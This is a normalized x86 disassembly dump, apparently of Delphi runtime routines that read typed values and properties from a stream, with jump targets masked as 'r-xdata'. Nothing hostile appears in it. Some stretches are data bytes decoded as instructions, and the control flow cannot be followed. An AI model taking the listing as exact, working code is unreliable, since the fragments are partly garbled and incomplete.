push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebx + 0x30 ]
call sub_403154
xor eax eax
mov [ ebx + 0x30 ] eax
inc esi
xor edi edi
mov edx edi
mov eax [ ebx + 0x30 ]
call sub_4185b0
call sub_403154
inc edi
dec esi
jne r-xdata
sub_41c04c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] eax
mov eax edx
call sub_40309c
mov ebp eax
jmp r-xdata
cmp ebp [ r-xdata ]
jne r-xdata
mov eax ebp
call sub_417a08
mov esi eax
test esi esi
je r-xdata
mov eax [ esp ]
mov eax [ eax + 0x74 ]
test eax eax
je r-xdata
mov eax ebp
call sub_4030e0
mov ebp eax
movsx ebx [ esi ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ esp + 0x4 ]
call sub_417a80
mov edi eax
mov edx [ esp + 0x4 ]
call sub_417980
mov edi eax
jmp r-xdata
inc ebx
mov [ esp + 0x8 ] 0x0
mov eax edi
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
inc [ esp + 0x8 ]
dec ebx
jne r-xdata
mov eax [ esp + 0x8 ]
mov eax [ esi + eax * 4 + 0x2 ]
mov edi [ eax ]
mov edx [ esp + 0x4 ]
mov eax edi
call sub_4030b8
test al al
jne r-xdata
sub_41c11c
push esi
push edi
push ebx
mov edi edx
mov ebx ecx
mov esi eax
jmp r-xdata
or ebx ebx
jne r-xdata
mov ecx [ esi + 0x14 ]
sub ecx [ esi + 0x10 ]
ja r-xdata
pop ebx
pop edi
pop esi
retn
cmp ecx ebx
jb r-xdata
mov eax esi
call sub_41c168
mov ecx [ esi + 0x14 ]
push esi
sub ebx ecx
mov eax [ esi + 0x8 ]
add eax [ esi + 0x10 ]
add [ esi + 0x10 ] ecx
mov esi eax
mov edx ecx
shr ecx 0x2
cld
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop esi
mov ecx ebx
sub_41c168
push ebx
push esi
mov ebx eax
mov edx [ ebx + 0x8 ]
mov ecx [ ebx + 0xc ]
mov eax [ ebx + 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov esi eax
mov [ ebx + 0x14 ] esi
test esi esi
jne r-xdata
xor eax eax
mov [ ebx + 0x10 ] eax
pop esi
pop ebx
retn
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b764
call sub_403908
sub_41c1b8
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_41c203
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_41d9b8
mov eax [ ebp - 0x4 ]
call sub_404210
dec eax
jle r-xdata
mov eax [ ebp - 0x4 ]
mov bl [ eax ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c20a
lea eax [ ebp - 0x4 ]
call sub_403f50
retn
call sub_41bbf4
sub_41c210
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
xor eax eax
push ebp
push sub_41c2b0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_41bdb4
test al al
jne r-xdata
mov eax ebx
call sub_41bdb4
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41924c
jmp r-xdata
mov eax ebx
call sub_41c0f8
add al 0xfe
sub al 0x3
jae r-xdata
mov eax ebx
call sub_41cd20
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c2b7
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
retn
mov eax [ ebp - 0x4 ]
call sub_419180
mov esi eax
mov eax ebx
call sub_41cd18
jmp r-xdata
mov eax ebx
call sub_41cc68
mov eax ebx
call sub_41bdb4
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_41ce84
mov eax ebx
call sub_41cd20
sub_41c2e0
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_404f48
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ebp
retn
inc ebx
xor esi esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax + esi * 4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x34 ]
call sub_418454
inc esi
dec ebx
jne r-xdata
sub_41c31c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi eax
mov eax edi
call sub_4215f0
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_404f48
inc eax
push eax
mov eax [ ebp + 0x8 ]
add eax 0xfffffffc
mov ecx 0x1
mov edx [ r-xdata ]
call sub_405104
add esp 0x4
mov edx ebx
mov eax edi
call sub_4215c4
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_404f48
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
pop ecx
mov [ edx + eax * 4 - 0x4 ] ecx
mov edx ebx
mov eax edi
call sub_4215c4
test [ eax + 0x24 ] 0x4
je r-xdata
sub_41c394
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x3 ] dl
mov [ ebp - 0x2 ] ax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_404f48
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
inc esi
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edi [ eax + ebx * 4 ]
mov ax [ ebp - 0x2 ]
not eax
and ax [ edi + 0x1c ]
mov edx [ ebp + 0x8 ]
mov [ edi + 0x1c ] ax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edi [ eax + ebx * 4 ]
mov ax [ edi + 0x1c ]
or ax [ ebp - 0x2 ]
mov edx [ ebp + 0x8 ]
mov [ edi + 0x1c ] ax
jmp r-xdata
cmp [ ebp - 0x3 ] 0x0
je r-xdata
inc ebx
dec esi
jne r-xdata
sub_41c3fc
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test [ eax - 0x9 ] 0x1
jne r-xdata
xor eax eax
pop ebp
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
je r-xdata
mov al 0x1
pop ebp
retn
sub_41c41c
push ebp
mov ebp esp
push ebx
push esi
mov esi eax
xor ebx ebx
call sub_40276c
mov edx [ r-xdata ]
call sub_4032e0
test al al
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
push eax
call sub_41c3fc
pop ecx
test al al
je r-xdata
xor eax eax
mov [ esi ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
xor edx edx
call sub_41de4c
call sub_40276c
mov edx [ eax + 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov ebx eax
mov eax [ esi ]
call sub_403154
sub_41c47c
push ebp
mov ebp esp
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_41c562
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_41dfec
mov ebx eax
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax - 0x14 ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp [ eax + 0x6a ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x14 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
push eax
mov eax [ ebp + 0x8 ]
mov esi [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov ecx ebx
mov eax [ esi + 0x6c ]
call [ esi + 0x68 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or [ eax + 0x1c ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax ebx
call [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x14 ] eax
mov eax [ ebp + 0x8 ]
test [ eax - 0x9 ] 0x4
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
xor eax eax
push ebp
push sub_41c536
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ eax + 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or edx 0xffffffff
mov ebx [ eax ]
call [ ebx + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or [ eax + 0x1c ] 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or [ eax + 0x1c ] 0x200
sub_41c567
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
call sub_41c41c
pop ecx
test al al
jne r-xdata
call sub_403984
pop edi
pop esi
pop ebx
pop ebp
retn
call sub_403930
sub_41c58c
push ebp
mov ebp esp
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_41c604
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax + 0x2c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov si 0xfff8
call sub_403350
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x1c ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x14 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
test [ eax + 0x1c ] 0x10
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x1c ]
call sub_417f70
mov edx [ ebp + 0x8 ]
cmp eax [ edx - 0x14 ]
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or [ eax + 0x1c ] 0x200
sub_41c609
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
call sub_41c41c
pop ecx
test al al
jne r-xdata
call sub_403984
pop edi
pop esi
pop ebx
pop ebp
retn
call sub_403930
sub_41c62c
push ebp
mov ebp esp
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_41c6a7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_41dfec
mov ecx eax
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x1c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x14 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov si 0xfff2
call sub_403350
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov [ eax + 0x2c ] ebx
mov eax [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov [ edx + 0x2c ] eax
pop edi
pop esi
pop ebx
pop ebp
retn
sub_41c6ac
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
call sub_41c41c
pop ecx
test al al
jne r-xdata
call sub_403984
pop edi
pop esi
pop ebx
pop ebp
retn
call sub_403930
sub_41c6d0
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_41c8f1
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x20 ]
lea edx [ ebp - 0x9 ]
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x8 ]
call sub_41d97c
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x8 ]
call sub_41d97c
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x2c ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x1c ]
mov [ ebp - 0x28 ] eax
xor eax eax
push ebp
push sub_41c8c1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
cmp [ ebp - 0x14 ] 0x0
je r-xdata
test [ ebp - 0x9 ] 0x1
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x24 ]
mov [ eax + 0x2c ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x28 ]
mov [ eax + 0x1c ] edx
retn
xor eax eax
push ebp
push sub_41c87f
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
mov eax [ ebp - 0x14 ]
call sub_41c31c
pop ecx
mov eax [ ebp - 0x14 ]
or [ eax + 0x1c ] 0x1
push ebp
mov dl 0x1
mov ax [ r-xdata ]
call sub_41c394
pop ecx
test [ ebp - 0x9 ] 0x1
jne r-xdata
push ebp
call sub_41c47c
pop ecx
push ebp
call sub_41c62c
pop ecx
jmp r-xdata
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
push ebp
call sub_41c58c
pop ecx
mov eax [ ebp - 0x14 ]
test [ eax + 0x1d ] 0x2
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
call sub_4039b4
jmp r-xdata
mov eax [ ebp - 0x14 ]
or [ eax + 0x1c ] 0x2
push ebp
mov dl 0x1
mov ax [ r-xdata ]
call sub_41c394
pop ecx
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
mov eax [ ebp - 0x14 ]
and [ eax + 0x1c ] 0xfffd
push ebp
xor edx edx
mov ax [ r-xdata ]
call sub_41c394
pop ecx
test [ ebp - 0x9 ] 0x2
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x14 ]
mov [ eax + 0x1c ] edx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c8f8
lea eax [ ebp - 0x1c ]
mov edx 0x2
call sub_403f74
lea eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_405110
retn
test [ ebp - 0x9 ] 0x1
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x2c ]
mov ecx [ ebp - 0x20 ]
mov edx [ ebp - 0x14 ]
mov si 0xfff9
call sub_403350
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x14 ]
call sub_41860c
test eax eax
jge r-xdata
mov eax [ ebp - 0x14 ]
test [ eax + 0x1d ] 0x2
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
push ebp
mov eax [ ebp - 0x14 ]
call sub_41c2e0
pop ecx
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x14 ]
call sub_418454
jmp r-xdata
push ebp
mov eax [ ebp - 0x14 ]
call sub_41c2e0
pop ecx
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x14 ]
call sub_418454
sub_41c884
push ebp
call sub_41c3fc
pop ecx
test al al
je r-xdata
call sub_403930
call sub_403984
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x24 ]
mov [ eax + 0x2c ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x28 ]
mov [ eax + 0x1c ] edx
retn
mov eax [ ebp - 0x14 ]
call sub_403154
sub_41c90c
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41c97c
pop ebx
pop ecx
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403124
mov edx [ ebp - 0x4 ]
mov [ edx + 0x30 ] eax
xor eax eax
push ebp
push sub_41c967
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41c97c
mov eax [ ebp - 0x4 ]
call sub_41becc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41c010
retn
sub_41c97c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41bdb4
test al al
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41ce84
mov eax [ ebp - 0x4 ]
call sub_41cd20
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2c ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov [ ebp - 0xc ] eax
mov eax ebx
mov si 0xfffb
call sub_403350
mov edx [ ebp - 0x4 ]
mov [ edx + 0x2c ] eax
xor eax eax
push ebp
push sub_41ca3e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov si 0xfffc
call sub_403350
mov edi eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x28 ] edi
test edi edi
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_41bdb4
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x28 ] eax
jmp r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_41c6d0
mov eax [ ebp - 0x4 ]
call sub_41cd20
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ca45
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x2c ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x28 ] edx
retn
sub_41ca4c
push ebx
add esp 0xffffffec
mov ebx eax
mov eax ebx
call sub_41db58
cmp al 0x5
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_41ccd4
mov [ esp + 0xc ] eax
mov [ esp + 0x10 ] edx
fild [ esp + 0xc ]
fstp [ esp ]
fwait
mov edx esp
mov ecx 0xa
mov eax ebx
call sub_41c11c
jmp r-xdata
fld [ esp ]
add esp 0x14
pop ebx
retn
sub_41ca90
push ebx
add esp 0xfffffff4
mov ebx eax
mov eax ebx
call sub_41db58
cmp al 0xf
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_41ccd4
mov [ esp + 0x4 ] eax
mov [ esp + 0x8 ] edx
fild [ esp + 0x4 ]
fstp [ esp ]
fwait
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_41c11c
jmp r-xdata
fld [ esp ]
add esp 0xc
pop ebx
retn
sub_41cad4
push ebx
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_41db58
cmp al 0x10
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_41ccd4
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
mov edx esp
mov ecx 0x8
mov eax ebx
call sub_41c11c
jmp r-xdata
fild [ esp ]
add esp 0x10
pop ebx
retn
sub_41cb24
push ebx
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_41db58
cmp al 0x11
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_41ccd4
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
mov edx esp
mov ecx 0x8
mov eax ebx
call sub_41c11c
jmp r-xdata
fld [ esp ]
add esp 0x10
pop ebx
retn
sub_41cb68
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_41db58
and eax 0x7f
cmp eax 0xd
ja r-xdata
call sub_41bbf4
mov al [ eax + lookup_table_41cb8f ]
jmp [ eax * 4 + jump_table_41cb9d ]
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_41c11c
xor ecx ecx
mov cl [ esp ]
mov eax esi
xor edx edx
call sub_404040
mov eax esi
call j_sub_40441c
mov edx eax
xor ecx ecx
mov cl [ esp ]
mov eax ebx
call sub_41c11c
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_403fa4
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_403fa4
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_403fa4
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_403fa4
jmp r-xdata
pop edx
pop esi
pop ebx
retn
sub_41cc68
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_41db58
sub al 0x2
je r-xdata
lea edx [ esp + 0x4 ]
mov ecx 0x1
mov eax ebx
call sub_41c11c
movsx eax [ esp + 0x4 ]
mov [ esp ] eax
jmp r-xdata
dec al
je r-xdata
mov eax [ esp ]
pop ecx
pop edx
pop ebx
retn
lea edx [ esp + 0x6 ]
mov ecx 0x2
mov eax ebx
call sub_41c11c
movsx eax [ esp + 0x6 ]
mov [ esp ] eax
jmp r-xdata
dec al
je r-xdata
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_41c11c
jmp r-xdata
jmp r-xdata
call sub_41bbf4
sub_41ccd4
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_41c0f8
cmp al 0x13
jne r-xdata
mov eax ebx
call sub_41cc68
cdq
mov [ esp ] eax
mov [ esp + 0x4 ] edx
mov eax ebx
call sub_41db58
mov edx esp
mov ecx 0x8
mov eax ebx
call sub_41c11c
jmp r-xdata
mov eax [ esp ]
mov edx [ esp + 0x4 ]
pop ecx
pop edx
pop ebx
retn
sub_41cd28
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov al [ r-xdata ]
mov [ esi ] al
mov eax ebx
call sub_41c0f8
and al 0xf0
cmp al 0xf0
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_41db58
and al 0xf
mov [ esi ] al
test [ esi ] 0x2
je r-xdata
mov eax ebx
call sub_41cc68
mov [ edi ] eax
sub_41cd65
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
add esp 0xfffffedc
push ebx
xor edx edx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_41ce59
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_403f50
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ r-xdata ]
call sub_4032e0
test al al
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0x8 ]
call sub_403fe8
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x124 ] eax
mov [ ebp - 0x120 ] 0xb
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x11c ] eax
mov [ ebp - 0x118 ] 0xb
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov [ ebp - 0x114 ] eax
mov [ ebp - 0x110 ] 0xb
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x10c ] eax
mov [ ebp - 0x108 ] 0xb
lea eax [ ebp - 0x124 ]
push eax
push 0x3
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7a0
call sub_403908
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ce60
lea edx [ ebp - 0x104 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
call sub_4030a4
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_4041b4
sub_41ce84
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_41d054
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
push ebp
push j_sub_403748#9
push [ fs : edx ]
mov [ fs : edx ] esp
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
call sub_41d97c
xor edx edx
push ebp
push j_sub_403748#8
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx 0x1
mov eax [ ebp - 0x8 ]
call sub_404210
mov esi eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0xc ]
mov [ eax + 0x78 ] 0x1
cmp esi ebx
jl r-xdata
mov eax [ ebp - 0xc ]
add eax 0x70
push eax
mov ecx ebx
sub ecx edi
mov edx edi
mov eax [ ebp - 0x8 ]
call sub_404470
cmp esi ebx
jl r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + ebx - 0x1 ] 0x2e
jne r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax ]
call sub_40337c
mov edx [ ebp - 0xc ]
mov edx [ edx + 0x70 ]
call sub_414900
mov edi eax
test edi edi
je r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax ]
call sub_40337c
mov edx [ ebp - 0xc ]
mov edx [ edx + 0x70 ]
call sub_414900
mov edi eax
test edi edi
jne r-xdata
inc ebx
mov eax [ ebp - 0xc ]
mov [ eax + 0x78 ] 0x0
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov eax [ ebp - 0xc ]
mov [ eax + 0x78 ] 0x1
mov eax [ ebp - 0xc ]
cmp [ eax + 0x70 ] 0x0
je r-xdata
mov ecx edi
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
call sub_41d208
jmp r-xdata
xor eax eax
mov [ ebp - 0x14 ] eax
mov eax [ edi ]
mov eax [ eax ]
cmp [ eax ] 0x7
jne r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x70 ]
mov eax [ ebp - 0xc ]
call sub_41c108
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x70 ]
mov eax [ ebp - 0xc ]
call sub_41c108
mov eax [ ebp - 0x14 ]
mov edx [ r-xdata ]
call sub_4032e0
test al al
jne r-xdata
mov edx edi
mov eax [ ebp - 0x10 ]
call sub_4149f4
mov [ ebp - 0x14 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
inc ebx
jmp r-xdata
push ebp
call sub_41ce68
pop ecx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d05b
lea eax [ ebp - 0x8 ]
call sub_403f50
retn
mov edi ebx
jmp r-xdata
sub_41d00e
add [ eax ] eax
add [ eax ] al
lodsb [ esi ]
jo r-xdata
ja r-xdata
add [ edx ] bl
rol [ ecx ] 0x1
mov ebx eax
mov eax [ ebp - 0xc ]
cmp [ eax + 0x78 ] 0x0
je r-xdata
inc eax
sbb [ eax + 0x56 ] dl
push 0x0
push edi
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_41b688
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_418454
pop edi
pop esi
pop ebx
pop ebp
retn
call sub_403930
mov edx [ ebx + 0x4 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
test al al
jne r-xdata
call sub_403984
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d05b
lea eax [ ebp - 0x8 ]
call sub_403f50
retn
sub_41d064
push ebp
mov ebp esp
add esp 0xfffffff8
